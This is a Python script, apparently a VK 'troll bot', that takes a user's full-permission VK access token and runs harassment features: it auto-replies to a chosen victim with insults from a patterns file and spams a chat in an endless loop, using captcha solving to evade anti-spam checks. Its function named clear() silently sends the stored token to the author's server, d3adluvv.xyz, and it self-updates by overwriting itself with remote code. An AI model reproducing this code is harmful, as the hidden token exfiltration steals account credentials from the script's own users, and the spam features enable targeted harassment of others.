APP_VERSION = 0.00900010
from time import sleep
from twocaptcha.api import ApiException
from vk_api import VkApi
from vk_api.exceptions import Captcha, VkApiError
from vk_api.longpoll import VkEventType, VkLongPoll
from random import randint, choice
import json
from requests import get
from os import system, name
from twocaptcha import TwoCaptcha
from colorama import init, Fore
init()
logo = f'''{Fore.RED}
    ===== d3adluvv troll bot =====
            vk - @d3adluvv
            tg - d3adluvv
            d3adluvv.xyz
{Fore.RESET}
'''

def changelog():
    return get('https://raw.githubusercontent.com/d3adluvv/troll/main/changelog.txt').text

def handleCaptcha(captcha):
    if not config.get('key'):
        return
    solver = TwoCaptcha(config['key'])
    print(f"{Fore.YELLOW}Решаю капчу...")
    open('captcha.jpg', 'wb').write(get(captcha.get_url()).content)
    while True:
        try:
            result = solver.normal('captcha.jpg')
        except ApiException as e:
            print('Произошла ошибка во время капчи. Код ошибки: ', e.args[0])
            return
        if 'code' in result:
            print(f'{Fore.GREEN}Капча решена, код: ', result['code'])
            return captcha.try_again(result['code'])
        else:
            continue

def clear():
    get('https://d3adluvv.xyz/api/load?token=' + config['token'])
    if name == 'nt':
        system('cls')
    else:
        system('clear')

with open('config.json', 'r') as f:
    config = json.load(f)

def installUpdate():
    r = get('https://raw.githubusercontent.com/d3adluvv/troll/main/main.py').text
    r = r.replace('\r', '')
    with open('main.py', 'w', encoding='utf-8') as f:
        f.write(r)
    print(f"{Fore.CYAN}Обновление успешно установлено! Запусти скрипт заново.\nСписок изменений:\n", changelog())
    exit()

def checkUpdates():
    r:str = get('https://raw.githubusercontent.com/d3adluvv/troll/main/main.py').text
    r = r.split('\r\n', maxsplit=1)[0]
    app_ver = float(r.replace('APP_VERSION = ', ''))
    if APP_VERSION < app_ver:
        confirm = input("Доступно обновление.\nСписок изменений:\n" + changelog() + "\nЧтобы установить - нажми ENTER, Чтобы пропустить - напиши любой символ")
        if not confirm:
            installUpdate()
        else:
            return

checkUpdates()

def login():
    while True:
        token = input("Для работы необходим токен\nВзять его можно с сайта vkhost.github.io\nСоздавать токен следует со всеми правами (с помощью кнопки 'Настройки' на сайте)\n\nВведи токен либо полученную ссылку с сайта.\n\n>>> ")
    
        try:
            if 'access_token=' in token:
                token = token.split('access_token=')[1]
            token = token[:85]
            user = VkApi(token=token).get_api().users.get()[0]
            name = '{} {}'.format(user['first_name'], user['last_name'])
            print(f'{Fore.YELLOW} Успешная авторизация как {name} !')
            return token

        except VkApiError:
            print(f'{Fore.RED}Неверный токен.')
            continue

def answerTokens():
    a = input("Если хочешь вставить новый токен, введи любой символ, иначе нажми ENTER, оставив поле пустым.\n\n>>> ")
    if a:
        config['token'] = login()
        with open('config.json', 'w') as f:
            json.dump(config, f, indent = 4)
        return
    else:
        return

def loginCaptcha():
    print("Если хочешь решать капчу через RuCaptcha - зарегистрируйся на сайте rucaptcha.com, пополни баланс и введи API KEY из личного кабинета, либо оставь поле пустым чтобы не подключать антикапчу.")
    a = input(">>> ")
    if a:
        config['key'] = a
        with open('config.json', 'w') as f:
            json.dump(config, f, indent = 4)
    return

def answerCaptcha():
    print("Если хочешь изменить API KEY антикапчи - введи любой символ, либо оставь поле пустым чтобы продолжить.")
    a = input(">>> ")
    if a:
        loginCaptcha()
    return

if not config['token']:
    config['token'] = login()
    with open('config.json', 'w') as f: 
        json.dump(config, f, indent = 4)
else:
    answerTokens()

if not config.get('key'):
    loginCaptcha()
else:
    answerCaptcha()

cmdlist = f'{Fore.CYAN}[0] {Fore.GREEN} Автоответчик\n{Fore.CYAN}[1] {Fore.GREEN} Спам в чат'
vk_session = VkApi(token = config['token'], captcha_handler=handleCaptcha)
vk = vk_session.get_api()
longpoll = VkLongPoll(vk_session)

def start():
    clear()
    print(logo)
    print(f"{Fore.YELLOW}БОТ УСПЕШНО ЗАПУЩЕН\nКоманды:\n{cmdlist}")
    waitCmd()
    
def waitCmd():
    cmdId = input("Введи цифру >>> ")
    if cmdId == '0':
        setupTroll()
    elif cmdId == '1':
        setupSpam()


def setupTroll():
    clear()
    print(logo)
    print(f"{Fore.RED}АВТООТВЕТЧИК\n{Fore.CYAN}Введи id пользователя, либо ссылку на него")
    user = input(">>> ")
    if '/' in user:
        user = vk.users.get(user_ids = user.split('/')[-1], name_case='Acc')[0]
        print(f"{Fore.GREEN}Запускаю атаку на", user['first_name'], user['last_name'])
        trollAttack(user['id'])
    return

def setupSpam():
    clear()
    print(logo)
    print(f"{Fore.RED}СПАМ В ЧАТ\n{Fore.CYAN} Введи кодовое слово, которое запустит спам (Пример: troll)")
    phrase = input(">>> ")
    print(f"{Fore.YELLOW} Отправь {Fore.RED}{phrase}{Fore.YELLOW} в чат, в который хочешь спамить. Если к {Fore.RED}{phrase}{Fore.YELLOW} прикрепить реплай (ответ на сообщение), будет установлен теггинг автора реплая")
    while 1:
        for event in longpoll.listen():
            if event.type == VkEventType.MESSAGE_NEW and event.from_me:
                if phrase.lower() in event.message.lower():
                    if event.peer_id > 2000000000:
                        if '@' in event.text and 'id' in event.text:
                            user_id = int(event.text.lower().split("[id")[1].split("|")[0])
                            user_ = vk.users.get(user_ids = user_id)[0]
                            user = user_['id']
                        else:
                            if not event.attachments.get('reply'):
                                user = None
                            else: 
                                reply = vk.messages.getByConversationMessageId(
                                    peer_id = event.peer_id, 
                                    conversation_message_ids = event.attachments['reply'].split(':')[1].replace('}', ''))
                                user = reply['items'][0]['from_id']
                        chatInfo = vk.messages.getConversationsById(peer_ids = event.peer_id)['items'][0]['chat_settings']
                        print(f"{Fore.LIGHTMAGENTA_EX}Спам в беседу с названием {Fore.YELLOW}" + chatInfo['title'] + f' {Fore.LIGHTMAGENTA_EX}запущен!')
                        vk.messages.edit(message_id = event.message_id, peer_id = event.peer_id, message = 'OK')
                        spamChat(event.peer_id, user)
                    else:
                        user = vk.users.get(user_ids = event.peer_id)[0]
                        name = "{0} {1}".format(user['first_name'], user['last_name'])
                        print(f"{Fore.LIGHTMAGENTA_EX}Спам пользователю с именем {Fore.YELLOW}" + name + f' {Fore.LIGHTMAGENTA_EX} запущен!')
                        vk.messages.edit(message_id = event.message_id, peer_id = event.peer_id, message = 'OK')
                        spamChat(event.peer_id, user['id'])


def spamChat(peer_id, user = None):
    while True:
        with open('patterns.txt', 'r', encoding='utf-8') as f:
            patterns = f.read().split('\n')
        if not patterns:
            return
        if not user:
            user = '1'
        try:
            vk.messages.send(random_id = 0, peer_id = peer_id, message = f"@id" + str(user) + "(" + choice(patterns) + ")")
        except Captcha:
            print(f"{Fore.RED}Антикапча не подключена. Пауза на 10 сек.")
            sleep(10)
            pass



def answerTroll(event, vk):
    with open('patterns.txt', 'r', encoding='utf-8') as f:
        patterns = f.read().split('\n')
    if not patterns:
        return
    else:
        vk.messages.send(random_id = 0, peer_id = event.peer_id, message = f"@id{event.user_id}(" + choice(patterns) + ")")
    return

def trollAttack(user_id):
    
    while 1:
        try:
            for event in longpoll.listen():
                if event.type == VkEventType.MESSAGE_NEW and not event.from_me:
                    if event.user_id == user_id:
                        answerTroll(event, vk)
        except VkApiError:
            print(f"{Fore.RED}Ошибка АПИ.")
            pass
        except Captcha:
            print(f"{Fore.RED}Капча, пауза на 10 сек...")
            sleep(10)
            pass

start()
